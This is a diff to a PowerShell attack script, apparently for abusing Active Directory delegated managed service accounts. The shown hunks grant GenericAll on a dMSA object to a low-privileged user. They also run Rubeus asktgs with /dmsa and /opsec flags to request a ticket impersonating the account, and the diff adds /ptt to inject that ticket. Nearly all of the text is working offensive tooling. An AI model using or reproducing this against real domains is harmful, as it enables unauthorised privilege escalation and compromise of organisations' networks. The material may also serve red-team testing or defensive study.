@@ -76,15 +76,15 @@ catch {
 try {
     Write-Host "`n[*] Granting GenericAll to $LowPrivUser on $dmsaDN..."
     $sid = (Get-ADUser -Identity ($LowPrivUser.Split("\\")[-1])).SID
-    $acl = Get-Acl "AD:\$dmsaDN"
+    $acl = Get-Acl "AD:\$dmsaDN" -ErrorAction Stop
     $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $sid, "GenericAll", "Allow"
     $acl.AddAccessRule($rule)
-    Set-Acl -Path "AD:\$dmsaDN" -AclObject $acl
-    Write-Host "[+] GenericAll permission granted."
-    Read-Host "Press ENTER to set delegation values..."
+    Set-Acl -Path "AD:\$dmsaDN" -AclObject $acl -ErrorAction Stop
+    Write-Host "[+] Permission granted."
+    Read-Host "`n[+] ACL updated. Press ENTER to continue..."
 }
 catch {
-    Write-Error "[-] Failed to apply GenericAll:"
+    Write-Error "[-] Failed to apply ACL:"
     $_ | Format-List * -Force
     return
 }
@@ -134,7 +134,7 @@ Write-Host "[+] Extracted base64 TGT ticket."
 Read-Host "Press ENTER to request TGS..."
 
 ### 10. Request TGS impersonating dMSA
-$tgsCmd = "Rubeus.exe asktgs /targetuser:$DMSAName`$ /service:krbtgt/$Domain /dmsa /ticket:$base64TGT /opsec /nowrap"
+$tgsCmd = "Rubeus.exe asktgs /targetuser:$DMSAName`$ /service:krbtgt/$Domain /dmsa /ticket:$base64TGT /opsec /ptt /nowrap"
 Write-Host "`n[*] Requesting TGS..."
 Write-Host "[>] $tgsCmd"
 $tgsOutput = Invoke-Expression $tgsCmd
